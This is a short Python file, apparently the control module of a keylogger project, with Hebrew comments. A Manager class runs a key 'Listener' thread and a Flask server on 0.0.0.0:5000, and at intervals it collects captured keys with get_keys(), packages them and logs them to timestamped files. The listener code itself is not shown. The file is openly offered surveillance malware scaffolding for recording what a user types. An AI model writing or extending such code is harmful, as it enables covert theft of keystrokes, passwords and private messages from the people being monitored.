import threading
from time import sleep
from service.listener import Listener
from service.data_collector import Package
from time_stamp import time_stamp2
from file_creator import log
from networkWriter import NetworkWriter
from backend.server import app

class Manager:
    def __init__(self, hours=5):
        self.listener = Listener()
        self.service = threading.Thread(target=self.listener.run)
        self.hours = hours
        self.run = False
        # הפעלת השרת בפלסק בתוך thread בלי reloader
        self.run_server = threading.Thread(
            target=app.run,
            kwargs={'host': '0.0.0.0', 'port': 5000, 'use_reloader': False},
            daemon=True  # כך שהשרת לא יחסום יציאה מהתוכנית
        )

    def start(self):
        self.service.start()
        self.run = True
        self.run_server.start()
        print("שרת ו־Listener הופעלו בהצלחה")
        while self.run:
            sleep(self.hours)
            temp_data = self.listener.get_keys()
            if temp_data:
                data = Package(temp_data)
                pack_name = f'{time_stamp2()}.txt'
                log(pack_name, str(data.export_package()))

    def stop(self):
        self.listener.stop()
        self.run = False


if __name__ == '__main__':
    p = Manager()
    p.start()
